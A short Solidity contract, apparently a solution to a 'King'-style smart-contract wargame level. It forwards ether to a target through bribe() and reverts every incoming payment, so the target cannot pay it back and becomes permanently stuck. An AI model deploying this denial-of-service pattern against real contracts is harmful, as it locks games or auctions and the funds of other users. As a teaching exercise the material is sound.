// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EternalKing {

  receive() external payable {
    revert("You cannot dethrone me, I am the eternal king!");
  }

  function bribe(address target) external payable returns (bool result) {
    (result,) = payable(target).call{value:msg.value}("");
  }
}